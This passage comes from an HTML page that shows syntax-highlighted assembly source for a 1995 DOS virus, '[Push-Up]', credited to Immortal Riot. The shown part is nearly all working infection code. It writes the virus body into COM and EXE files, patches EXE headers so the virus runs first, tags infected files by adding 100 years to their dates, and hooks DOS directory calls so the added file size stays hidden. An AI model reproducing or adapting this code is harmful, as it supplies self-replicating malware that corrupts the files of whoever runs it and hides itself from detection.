    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">;function ah=40h, write to</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">                            </span><span class="sc1">;file cx=bytes.</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">                                     </span><span class="sc1">;ds:dx=buffer to write from</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                 </span><span class="sc1">;bx=filehandle</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">infection_type</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; check for com_infect</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">write_first_bytes</span><span class="sc0">                      </span><span class="sc1">; equal, write first bytes!</span><span class="sc0">




    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                            </span><span class="sc1">;else, continue to infect</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">;an executed EXE</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                 </span><span class="sc1">;&lt;- Seek end of file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                              </span><span class="sc1">;Convert size to 512-byte</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;pages</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_increasment</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_increasment</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; Insert new filesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; into EXE header</span><span class="sc0">


</span><span class="sc5">write_first_bytes</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; Goto TOF and</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">;write header-info</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">;cx=3 if com, 18h if  exe</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">;restore time/date stamp from</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">century</span><span class="sc0">                          </span><span class="sc1">;stack. Mark with another</span><span class="sc0">
                                                </span><span class="sc1">;100 years...</span><span class="sc0">

</span><span class="sc5">restore_td</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;&lt;- Restore_time_date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                            </span><span class="sc1">;but add 100 years..</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;Close file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">no_open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">;restore segment/registers</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">org21</span><span class="sc0">                               </span><span class="sc1">;and return to int21h</span><span class="sc0">


</span><span class="sc5">Infect_EXE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">infection_type</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;mark exe-infect</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">csip</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;save original cs/ip</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;save original ss/sp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;dx:ax (fsize/10h) = para's</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;sub headersize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;Set starting CS:IP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;to end of EXE</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EXE_continue</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">; DIR-STEALTH ROUTINE</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc1">; 11/12/4e/4fh stealth routines are so common and generic these days,</span><span class="sc0">
</span><span class="sc1">; so it's for no reason to comment them. Similar routines can</span><span class="sc0">
</span><span class="sc1">; be found in for example ir-mag#7.zip (reality.013).</span><span class="sc0">

</span><span class="sc5">Stealth_FCB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">org21</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FCB_error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_extended</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">not_extended</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">century</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                           </span><span class="sc1">;not century marked...</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">century</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;   cmp word ptr es:[bx+1dh],vsize          ;Skip all file_size checks</span><span class="sc0">
</span><span class="sc1">;   ja fcb_stealth                          ;because it's pretty unlikely</span><span class="sc0">
</span><span class="sc1">;   cmp word ptr es:[bx+1fh],0              ;that any other file is</span><span class="sc0">
</span><span class="sc1">;   je no_stealth                   ;marked with + 100 years.</span><span class="sc0">

</span><span class="sc5">fcb_stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">vsize</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;size stealth done...</span><span class="sc0">
</span><span class="sc5">no_stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">FCB_error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">; Stealth on dir7's directory listenings, or other program which uses</span><span class="sc0">
</span><span class="sc1">; 4e/4fh for operating.</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">

</span><span class="sc5">Stealth_Handle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">org21</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">handle_error</span><span class="sc0">

    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">century</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_stealth_</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">century</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;   cmp word ptr es:[bx+1ah],vsize</span><span class="sc0">
</span><span class="sc1">;   ja stealth2</span><span class="sc0">
</span><span class="sc1">;   cmp word ptr es:[bx+1ch],0</span><span class="sc0">
</span><span class="sc1">;   je no_stealth_</span><span class="sc0">

</span><span class="sc5">stealth2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc5">vsize</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">no_stealth_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">Handle_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">;don't change flags...</span><span class="sc0">


</span><span class="sc5">vname</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Push-Up] v0.001 '</span><span class="sc0">                 </span><span class="sc1">;virusname &amp; version</span><span class="sc0">
</span><span class="sc5">EGO_tag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'(C) 1995 Immortal Riot (Sweden)'</span><span class="sc0">    </span><span class="sc1">;group &amp; origin</span><span class="sc0">

    </span><span class="sc5">infection_type</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;0=COM,1=EXE</span><span class="sc0">
    </span><span class="sc5">new_com</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;new host bytes, if com(our jmp)</span><span class="sc0">
    </span><span class="sc5">exeheader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">org_com</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;original hosts bytes, if com</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;exe-header...</span><span class="sc0">

</span><span class="sc5">vend</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">iobuf</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;a buffer for the original boot-record</span><span class="sc0">

</span><span class="sc5">heap_end</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host_start</span><span class="sc0">

</span></div></body>
</html>
